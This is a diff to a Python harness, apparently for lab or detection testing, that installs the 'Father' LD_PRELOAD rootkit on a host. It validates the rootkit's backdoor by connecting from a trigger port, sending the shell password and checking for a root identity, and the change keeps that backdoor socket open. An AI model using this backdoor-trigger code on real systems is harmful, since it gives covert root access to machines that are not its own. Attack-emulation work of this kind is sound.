@@ -60,7 +60,7 @@ def run_father(
     *,
     command_log_path: Path,
     scenario_id: str,
-) -> dict:
+) -> tuple[dict, socket.socket]:
     """Run Father visibly in Bash, then validate its native accept-hook shell."""
     if scenario_id not in (SCENARIO_ID, CLEANUP_SCENARIO_ID):
         raise ValueError(f"Unsupported Father scenario: {scenario_id}")
@@ -73,6 +73,14 @@ def run_father(
 
     terminal = ssh.open_terminal()
     cleanup_facts = {}
+    backdoor_socket = None
+
+    def close_backdoor_socket() -> None:
+        nonlocal backdoor_socket
+        if backdoor_socket is None:
+            return
+        backdoor_socket.close()
+        backdoor_socket = None
 
     try:
         with terminal:
@@ -109,7 +117,7 @@ def run_father(
 
             console.scope("HOST", "validate Father backdoor")
             try:
-                identity = _validate_backdoor(ssh)
+                identity, backdoor_socket = _validate_backdoor(ssh)
             except Exception as exc:
                 record_operation(command_log_path, "validate_backdoor", error=str(exc))
                 raise
@@ -133,22 +141,35 @@ def run_father(
                         "installed_library_present": True,
                     }
                 }
+    except BaseException:
+        close_backdoor_socket()
+        raise
     finally:
-        transcript_path.write_text(terminal.transcript, encoding="utf-8")
+        try:
+            transcript_path.write_text(terminal.transcript, encoding="utf-8")
+        except BaseException:
+            close_backdoor_socket()
+            raise
 
-    facts = {
-        "source": source,
-        "installed_library_path": INSTALLED_LIBRARY,
-        "preload_config_path": PRELOAD_CONFIG,
-        "hidden_file_path": f"{REMOTE_ROOT}/probe/{HIDDEN_FILE_NAME}",
-        "file_hiding_validated": True,
-        "backdoor_identity": identity,
-        "trigger_source_port": SOURCE_PORT,
-        "listener_service": "sshd",
-        "listener_port": ssh.port,
-    }
-    facts.update(cleanup_facts)
-    return facts
+    try:
+        facts = {
+            "source": source,
+            "installed_library_path": INSTALLED_LIBRARY,
+            "preload_config_path": PRELOAD_CONFIG,
+            "hidden_file_path": f"{REMOTE_ROOT}/probe/{HIDDEN_FILE_NAME}",
+            "file_hiding_validated": True,
+            "backdoor_identity": identity,
+            "backdoor_connection_open_at_scenario_completion": True,
+            "trigger_source_port": SOURCE_PORT,
+            "listener_service": "sshd",
+            "listener_port": ssh.port,
+        }
+        facts.update(cleanup_facts)
+        assert backdoor_socket is not None
+        return facts, backdoor_socket
+    except BaseException:
+        close_backdoor_socket()
+        raise
 
 
 def _verify_source(command_log_path: Path) -> dict:
@@ -190,17 +211,19 @@ def _upload_archive(
 
 def _validate_backdoor(
     ssh: SSHClient,
-) -> str:
+) -> tuple[str, socket.socket]:
     console.step(
         f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
         f"{SOURCE_PORT}..."
     )
+    client = None
     try:
-        with socket.create_connection(
+        client = socket.create_connection(
             (ssh.host, ssh.port),
             timeout=12,
             source_address=("", SOURCE_PORT),
-        ) as client, client.makefile("rb") as response:
+        )
+        with client.makefile("rb") as response:
             response.read(len(AUTHENTICATION_PROMPT))
             client.sendall(SHELL_PASSWORD)
             if not any(SHELL_MARKER in line for line in response):
@@ -215,11 +238,16 @@ def _validate_backdoor(
                 ),
                 None,
             )
+        if identity is None:
+            raise RuntimeError("Father shell did not return the expected root identity")
+        console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
+        console.ok(f"Father shell identity: {identity}")
+        return identity, client
     except OSError as exc:
+        if client is not None:
+            client.close()
         raise RuntimeError(f"Father backdoor connection failed: {exc}") from exc
-
-    if identity is None:
-        raise RuntimeError("Father shell did not return the expected root identity")
-    console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
-    console.ok(f"Father shell identity: {identity}")
-    return identity
+    except BaseException:
+        if client is not None:
+            client.close()
+        raise
